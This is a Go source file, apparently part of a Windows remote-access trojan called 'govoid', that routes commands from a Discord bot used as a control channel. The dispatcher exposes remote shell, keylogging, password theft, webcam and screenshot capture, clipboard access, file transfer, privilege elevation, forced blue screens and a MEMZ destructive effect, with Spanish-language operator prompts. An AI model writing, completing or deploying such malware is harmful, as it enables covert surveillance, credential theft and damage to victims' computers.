//go:build windows

package bot

import (
	"fmt"
	"log/slog"
	"runtime/debug"
	"strconv"
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/commands"
)

func interactionHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {
	defer func() {
		if recovered := recover(); recovered != nil {
			slog.Error("panic en interacción", "tipo", i.Type, "panic", recovered, "stack", string(debug.Stack()))
			_, _ = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
				Content: fmt.Sprintf("❌ Error interno en el agente.\n```\n%v\n```", recovered),
			})
		}
	}()

	session := currentSession()
	if session == nil {
		_ = commands.Reply(s, i, "⚠️ El agente no tiene sesión activa todavía.")
		return
	}

	switch i.Type {
	case discordgo.InteractionApplicationCommand:
		handleCommand(s, i)
	case discordgo.InteractionMessageComponent:
		handleComponent(s, i)
	case discordgo.InteractionModalSubmit:
		handleModal(s, i)
	default:
		_ = commands.Reply(s, i, "⚠️ Interacción no soportada.")
	}
}

func handleCommand(s *discordgo.Session, i *discordgo.InteractionCreate) {
	switch i.ApplicationCommandData().Name {
	case "shell":
		commands.Shell(s, i)
	case "screenshot":
		commands.Screenshot(s, i)
	case "keylog":
		commands.Keylog(s, i)
	case "google":
		commands.Google(s, i)
	case "sysinfo":
		commands.SysInfo(s, i)
	case "ps":
		commands.Processes(s, i)
	case "download":
		commands.Download(s, i)
	case "upload":
		commands.Upload(s, i)
	case "clip":
		commands.Clipboard(s, i)
	case "msgbox":
		commands.MsgBox(s, i)
	case "webcam":
		commands.Webcam(s, i)
	case "passwords":
		commands.Passwords(s, i)
	case "lockscreen":
		commands.LockScreen(s, i)
	case "kill":
		showKillModal(s, i)
	case "shutdown":
		showShutdownModal(s, i)
	case "elevate":
		commands.Elevate(s, i)
	case "bsod":
		commands.BSOD(s, i)
	default:
		_ = commands.Reply(s, i, "⚠️ Comando sin manejador: `"+i.ApplicationCommandData().Name+"`.")
	}
}

func handleComponent(s *discordgo.Session, i *discordgo.InteractionCreate) {
	customID := i.MessageComponentData().CustomID

	switch {
	case customID == "btn_screenshot":
		commands.Screenshot(s, i)
	case customID == "btn_sysinfo":
		commands.SysInfo(s, i)
	case customID == "btn_clipboard":
		commands.ClipboardGet(s, i)
	case customID == "btn_keylog_dump":
		commands.KeylogDump(s, i)
	case customID == "btn_google_close":
		commands.GooglePanel(s, i)
	case customID == "btn_memz":
		showMemzModal(s, i)
	case customID == "btn_memz_abort":
		commands.MemzAbort(s, i)
	case customID == "btn_google_refresh":
		commands.GoogleRefresh(s, i)
	case customID == "btn_google_all":
		commands.GoogleCloseAll(s, i)
	case customID == "sel_google_profile":
		commands.GoogleSelect(s, i)
	case strings.HasPrefix(customID, "btn_google_one_"):
		commands.GoogleCloseOne(s, i)
	case customID == "btn_keylog_start":
		commands.KeylogStart(s, i)
	case customID == "btn_keylog_stop":
		commands.KeylogStop(s, i)
	case customID == "btn_lock_on":
		commands.LockOn(s, i)
	case customID == "btn_lock_off":
		commands.LockOff(s, i)
	case customID == "btn_ps":
		commands.ListProcesses(s, i)
	case customID == "btn_shutdown":
		showShutdownModal(s, i)
	case customID == "btn_reconnect":
		forceReconnect(s, i)
	case customID == "btn_elevate":
		commands.ElevateButton(s, i)
	case customID == "btn_bsod":
		commands.BSODButton(s, i)
	case strings.HasPrefix(customID, "sel_ps_"):
		commands.ProcessSelected(s, i)
	case strings.HasPrefix(customID, "btn_pskill_"):
		pid, err := parsePID(customID)
		if err != nil {
			_ = commands.Reply(s, i, "❌ PID inválido.")
			return
		}
		commands.KillProcessFromButton(s, i, pid)
	case strings.HasPrefix(customID, "btn_ps_page_"):
		page, err := parsePage(customID)
		if err != nil {
			_ = commands.Reply(s, i, "❌ Página inválida.")
			return
		}
		commands.ProcessPage(s, i, page)
	default:
		_ = commands.Reply(s, i, "⚠️ Botón desconocido: `"+customID+"`.")
	}
}

func handleModal(s *discordgo.Session, i *discordgo.InteractionCreate) {
	data := i.ModalSubmitData()
	value := strings.TrimSpace(modalText(data, "confirm"))

	switch data.CustomID {
	case "modal_kill":
		if value != "CONFIRM" {
			_ = commands.Reply(s, i, "❌ Confirmación incorrecta. Escribe CONFIRM.")
			return
		}
		commands.Kill(s, i)
	case "modal_shutdown":
		if value != "SHUTDOWN" {
			_ = commands.Reply(s, i, "❌ Confirmación incorrecta. Escribe SHUTDOWN.")
			return
		}
		commands.Shutdown(s, i)
	case "modal_memz":
		if value != "MEMZ" {
			_ = commands.Reply(s, i, "❌ Confirmación incorrecta. Escribe MEMZ.")
			return
		}
		commands.MemzStart(s, i)
	default:
		_ = commands.Reply(s, i, "⚠️ Modal desconocido: `"+data.CustomID+"`.")
	}
}

func modalText(data discordgo.ModalSubmitInteractionData, customID string) string {
	for _, component := range data.Components {
		row, ok := component.(*discordgo.ActionsRow)
		if !ok {
			continue
		}
		for _, inner := range row.Components {
			input, ok := inner.(*discordgo.TextInput)
			if ok && input.CustomID == customID {
				return input.Value
			}
		}
	}
	return ""
}

func showKillModal(s *discordgo.Session, i *discordgo.InteractionCreate) {
	_ = s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseModal,
		Data: &discordgo.InteractionResponseData{
			CustomID: "modal_kill",
			Title:    "Confirmar Kill Agent",
			Components: []discordgo.MessageComponent{
				discordgo.ActionsRow{Components: []discordgo.MessageComponent{
					discordgo.TextInput{
						CustomID:    "confirm",
						Label:       "Escribe CONFIRM para matar el agente",
						Style:       discordgo.TextInputShort,
						Placeholder: "CONFIRM",
						Required:    true,
						MaxLength:   16,
					},
				}},
			},
		},
	})
}

func showMemzModal(s *discordgo.Session, i *discordgo.InteractionCreate) {
	_ = s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseModal,
		Data: &discordgo.InteractionResponseData{
			CustomID: "modal_memz",
			Title:    "Confirmar MEMZ",
			Components: []discordgo.MessageComponent{
				discordgo.ActionsRow{Components: []discordgo.MessageComponent{
					discordgo.TextInput{
						CustomID:    "confirm",
						Label:       "Escribe MEMZ para activar el efecto",
						Style:       discordgo.TextInputShort,
						Placeholder: "MEMZ",
						Required:    true,
						MaxLength:   8,
					},
				}},
			},
		},
	})
}

func showShutdownModal(s *discordgo.Session, i *discordgo.InteractionCreate) {
	_ = s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseModal,
		Data: &discordgo.InteractionResponseData{
			CustomID: "modal_shutdown",
			Title:    "Confirmar Shutdown + limpieza",
			Components: []discordgo.MessageComponent{
				discordgo.ActionsRow{Components: []discordgo.MessageComponent{
					discordgo.TextInput{
						CustomID:    "confirm",
						Label:       "Escribe SHUTDOWN para limpiar y salir",
						Style:       discordgo.TextInputShort,
						Placeholder: "SHUTDOWN",
						Required:    true,
						MaxLength:   16,
					},
				}},
			},
		},
	})
}

func forceReconnect(s *discordgo.Session, i *discordgo.InteractionCreate) {
	_ = commands.Reply(s, i, "📡 Forzando reconexión…")
	go func() {
		time.Sleep(500 * time.Millisecond)
		ForceReconnect()
	}()
}

func formatSessionName(num int) string {
	return fmt.Sprintf("sesion-%d", num)
}

func parsePID(customID string) (uint32, error) {
	raw := strings.TrimPrefix(customID, "btn_pskill_")
	pid, err := strconv.ParseUint(raw, 10, 32)
	if err != nil {
		return 0, err
	}
	if pid == 0 {
		return 0, strconv.ErrSyntax
	}
	return uint32(pid), nil
}

func parsePage(customID string) (int, error) {
	raw := strings.TrimPrefix(customID, "btn_ps_page_")
	page, err := strconv.Atoi(raw)
	if err != nil {
		return 0, err
	}
	if page < 0 {
		return 0, strconv.ErrSyntax
	}
	return page, nil
}
